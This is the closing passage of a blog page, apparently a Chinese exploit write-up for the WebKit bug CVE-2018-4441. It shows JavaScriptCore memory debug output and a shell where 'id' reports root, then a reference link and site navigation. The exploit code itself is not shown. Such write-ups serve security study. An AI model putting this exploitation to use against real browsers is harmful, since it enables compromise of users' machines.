Object: 0x7fffae2591f0 with butterfly 0x7fe000280058 (Structure 0x7fffaf670d20:[Array, &#123;prop:100, prop1:101&#125;, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 317
7fffae2591f0
Object: 0x7fffaf6c8380 with butterfly (nil) (Structure 0x7fffaf670e00:[Object, &#123;jscell:0, butterfly:1&#125;, NonArray, Proto:0x7fffaf6b4000, Leaf]), StructureID: 319
7fffae208000
7ffff000a500
7fffb0001000
# id
uid=0(root) gid=0(root) groups=0(root)
#
</code></pre>
<p>##参考链接</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7694/#toc-2">https://xz.aliyun.com/t/7694\#toc-2</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Webkit/%EF%BC%88CVE-2018-4441%EF%BC%89Webkit%20shiftCountWithArrayStorage/" data-id="cl5c2qxdl00jvy8v1avcyce8h" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Weblogic/weblogic%E7%88%86%E7%A0%B4/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/VMware%20vRealize/VMware%20vRealize%20Operations%20Manager%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21975/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>